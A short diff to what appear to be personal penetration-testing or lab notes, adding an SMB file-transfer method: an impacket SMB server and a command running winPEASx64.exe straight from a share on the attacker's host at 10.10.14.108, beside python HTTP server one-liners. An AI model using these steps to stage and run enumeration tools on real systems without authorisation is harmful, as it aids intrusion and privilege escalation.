@@ -16,7 +16,11 @@ From <https://github.com/rofl0r/proxychains-ng/issues/337>
 ## Setting up an SSH tunnel between the target and source with nc as proxy command:  
 TODO
 
-## File transfer techniques:  
+## File transfer techniques: 
+### Using SMB:  
+`impacket-smbserver share .`  
+Then `//10.10.14.108/share/winPEASx64.exe searchall cmd`    
+  
 ### Using python:  
 `python2 -m SimpleHTTPServer <PORT>`  
 `python3 -m http.server <PORT>`  
